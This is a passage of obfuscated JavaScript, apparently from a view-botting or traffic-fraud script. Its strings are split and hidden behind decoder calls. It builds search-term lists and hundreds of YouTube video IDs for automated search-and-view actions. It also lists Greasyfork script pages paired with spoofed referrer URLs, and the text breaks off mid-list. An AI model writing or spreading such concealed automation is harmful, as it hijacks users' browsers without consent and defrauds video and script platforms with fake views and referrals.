searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + X(0xa) + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xe85 + -0x15 * 0x52 + -0x18d * 0x5)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x94f + -0xa1b + 0xd6)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + Y(0x9) + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x84 + -0x9f8 + 0x977 * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    Z(0x16, 'v9*[') + '0',
    'OP5KGfXHX_' + 'A',
    Z(0x1, 'v9*[') + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    Y(0x17) + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    X(0x6) + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    X(0xe) + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x15) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + X(0xc) + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + Z(0x4, '#EIo') + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x14) + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
